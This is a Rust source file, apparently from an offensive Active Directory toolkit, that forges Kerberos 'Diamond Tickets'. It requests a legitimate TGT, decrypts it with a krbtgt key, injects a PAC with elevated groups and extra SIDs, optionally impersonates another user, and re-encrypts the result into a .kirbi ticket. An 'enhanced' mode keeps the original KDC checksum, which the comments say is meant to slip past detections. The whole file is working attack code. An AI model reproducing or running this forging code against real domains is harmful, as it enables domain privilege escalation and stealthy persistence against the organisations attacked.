//! Diamond Ticket forging — modify a legitimately requested TGT's PAC.
//!
//! Unlike Golden Tickets (forged from scratch), Diamond Tickets start
//! with a real TGT, decrypt it with the krbtgt key, modify the PAC,
//! and re-encrypt. This bypasses detections that check for TGTs not
//! issued by the KDC.
//!
//! ## Enhanced Diamond
//!
//! The enhanced variant preserves the original KDC checksum (PAC type 7) from the
//! legitimate TGT's PAC, cloning it into the new elevated-PAC. This maintains the
//! KDC_ISSUED indicator so KrbtgtFullPacSignature passes without triggering alarms
//! about freshly-computed checksums.

use chrono::{Duration, Utc};
use kerberos_asn1::{Asn1Object, EncTicketPart, EncryptedData, Ticket};
use kerberos_crypto::new_kerberos_cipher;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{ETYPE_AES256_CTS, ETYPE_RC4_HMAC};
use tracing::info;

use crate::golden;
use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
use crate::validate;

/// Forge a Diamond Ticket by modifying a legitimate TGT's PAC.
/// When the config has `enhanced = true`, preserves the original KDC checksum.
pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[diamond] Forging Diamond Ticket for {}", config.domain);

    let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge("Domain SID is required for Diamond Ticket".into())
    })?;
    validate::validate_sid_format(domain_sid)?;

    let (krbtgt_key, krbtgt_etype) = if let Some((ref session_key, session_etype)) =
        config.pkinit_session_key
    {
        info!(
            "[diamond] Using PKINIT session key for decrypt/encrypt (etype={}, {} bytes)",
            session_etype,
            session_key.len()
        );
        (session_key.clone(), session_etype)
    } else {
        let krbtgt_hash = config
            .krbtgt_hash
            .as_deref()
            .or(config.krbtgt_aes256.as_deref())
            .ok_or_else(|| {
                OverthroneError::TicketForge("krbtgt hash is required for Diamond Ticket".into())
            })?;
        let key = hex::decode(krbtgt_hash.trim())
            .map_err(|e| OverthroneError::TicketForge(format!("Invalid krbtgt hash: {e}")))?;
        let etype = match key.len() {
            16 => ETYPE_RC4_HMAC,
            32 => ETYPE_AES256_CTS,
            _ => {
                return Err(OverthroneError::TicketForge(format!(
                    "krbtgt key must be 16 or 32 bytes, got {}",
                    key.len()
                )));
            }
        };
        (key, etype)
    };

    // Step 1: Request a legitimate TGT from the KDC
    info!("[diamond] Step 1: Requesting TGT as {}", config.username);
    let legit_tgt = config.request_user_tgt().await?;

    info!(
        "[diamond] Legitimate TGT obtained (etype: {})",
        legit_tgt.session_key_etype
    );

    // Step 2: Decrypt the ticket's enc-part using krbtgt key (or PKINIT session key)
    info!("[diamond] Step 2: Decrypting ticket with forging key");
    let cipher = new_kerberos_cipher(krbtgt_etype)
        .map_err(|e| OverthroneError::TicketForge(format!("Cipher: {e}")))?;

    let decrypted_ticket = cipher
        .decrypt(&krbtgt_key, 2, &legit_tgt.ticket.enc_part.cipher)
        .map_err(|e| OverthroneError::TicketForge(format!("Ticket decrypt: {e}")))?;

    let (_, mut enc_ticket) = EncTicketPart::parse(&decrypted_ticket)
        .map_err(|e| OverthroneError::TicketForge(format!("Parse EncTicketPart: {e}")))?;

    info!("[diamond] Ticket decrypted successfully");

    // Step 3: Extract original KDC checksum from the legitimate PAC before modifying
    // This is the Enhanced Diamond technique — we preserve the KDC_ISSUED checksum bytes
    let original_kdc_checksum = extract_kdc_checksum(&enc_ticket);

    // Step 4: Modify the PAC with elevated privileges
    info!("[diamond] Step 3: Replacing PAC with elevated privileges");
    let impersonate = config.effective_impersonate();
    let groups = config.effective_groups();
    let realm = config.domain.to_uppercase();

    let new_pac = if let Some(ref kdc_checksum) = original_kdc_checksum {
        // Enhanced Diamond: build new PAC with elevated privs, inject original KDC checksum
        info!(
            "[diamond] Enhanced mode: preserving original KDC checksum ({} bytes)",
            kdc_checksum.len()
        );
        golden::build_pac_with_kdc_checksum(
            impersonate,
            &realm,
            domain_sid,
            config.user_rid,
            &groups,
            &config.extra_sids,
            &krbtgt_key,
            krbtgt_etype,
            kdc_checksum,
        )?
    } else {
        // Standard Diamond: full PAC rebuild
        golden::build_pac(
            impersonate,
            &realm,
            domain_sid,
            config.user_rid,
            &groups,
            &config.extra_sids,
            &krbtgt_key,
            krbtgt_etype,
        )?
    };

    enc_ticket.authorization_data = Some(vec![kerberos_asn1::AuthorizationDataEntry {
        ad_type: 1,
        ad_data: new_pac,
    }]);

    if impersonate != config.username {
        enc_ticket.cname = kerberos_asn1::PrincipalName {
            name_type: 1,
            name_string: vec![impersonate.to_string()],
        };
        info!(
            "[diamond] Changed cname: {} → {}",
            config.username, impersonate
        );
    }

    // Step 5: Re-encrypt with krbtgt key
    info!("[diamond] Step 4: Re-encrypting ticket");
    let re_encrypted = cipher.encrypt(&krbtgt_key, 7, &enc_ticket.build());

    let forged_ticket = Ticket {
        tkt_vno: 5,
        realm: legit_tgt.ticket.realm.clone(),
        sname: legit_tgt.ticket.sname.clone(),
        enc_part: EncryptedData {
            etype: krbtgt_etype,
            kvno: legit_tgt.ticket.enc_part.kvno,
            cipher: re_encrypted,
        },
    };

    let ticket_bytes = forged_ticket.build();
    let kirbi_bytes = golden::build_krb_cred(
        &forged_ticket,
        &enc_ticket,
        &legit_tgt.session_key,
        krbtgt_etype,
    )?;
    let kirbi_path = golden::save_ticket(config, &kirbi_bytes, "diamond")?;
    let etype_str = golden::etype_name(krbtgt_etype);
    let now = Utc::now();

    let enhanced = original_kdc_checksum.is_some();

    info!(
        "[diamond] Diamond Ticket forged ({} bytes, enhanced={})",
        ticket_bytes.len(),
        enhanced
    );

    Ok(ForgeResult {
        action: "Diamond Ticket".into(),
        domain: config.domain.clone(),
        success: true,
        ticket_data: Some(ForgedTicket {
            ticket_type: "Diamond Ticket (modified TGT)".into(),
            impersonated_user: impersonate.to_string(),
            domain: realm.clone(),
            spn: format!("krbtgt/{}", config.domain.to_uppercase()),
            encryption_type: etype_str.into(),
            valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
            valid_until: (now + Duration::hours(config.effective_lifetime() as i64))
                .format("%Y-%m-%d %H:%M:%S UTC")
                .to_string(),
            group_rids: groups,
            extra_sids: config.extra_sids.clone(),
            kirbi_path,
            ccache_path: None,
            kirbi_base64: Some(golden::base64_encode(&kirbi_bytes)),
            ticket_size_bytes: ticket_bytes.len(),
        }),
        persistence_result: None,
        message: format!(
            "{} Diamond Ticket forged: {} as {} ({})",
            if enhanced { "Enhanced" } else { "Standard" },
            realm,
            impersonate,
            etype_str
        ),
    })
}

/// Extract the KDC checksum (PAC type 7) from a decrypted ticket's PAC.
/// Returns `None` if the PAC can't be parsed or has no KDC checksum.
fn extract_kdc_checksum(enc_ticket: &EncTicketPart) -> Option<Vec<u8>> {
    let auth_data = enc_ticket.authorization_data.as_ref()?;
    let ad_entry = auth_data.first()?;
    let pac = &ad_entry.ad_data;

    if pac.len() < 8 {
        return None;
    }

    // PAC header: u32 num_buffers, u32 version
    let num_buffers = u32::from_le_bytes([pac[0], pac[1], pac[2], pac[3]]);
    let header_size = 8 + (num_buffers as usize * 16);

    if pac.len() < header_size {
        return None;
    }

    // Scan buffers for type 7 (KDC checksum)
    for i in 0..num_buffers as usize {
        let offset = 8 + i * 16;
        if offset + 16 > pac.len() {
            break;
        }
        let buf_type = u32::from_le_bytes([
            pac[offset],
            pac[offset + 1],
            pac[offset + 2],
            pac[offset + 3],
        ]);
        if buf_type == 7 {
            // Found KDC checksum — return the full buffer entry (type + size + offset + data)
            let buf_size = u32::from_le_bytes([
                pac[offset + 4],
                pac[offset + 5],
                pac[offset + 6],
                pac[offset + 7],
            ]) as usize;
            let buf_offset = u64::from_le_bytes([
                pac[offset + 8],
                pac[offset + 9],
                pac[offset + 10],
                pac[offset + 11],
                pac[offset + 12],
                pac[offset + 13],
                pac[offset + 14],
                pac[offset + 15],
            ]) as usize;

            if buf_offset + buf_size <= pac.len() && buf_size >= 4 {
                let checksum_data = pac[buf_offset..buf_offset + buf_size].to_vec();
                return Some(checksum_data);
            }
        }
    }

    None
}
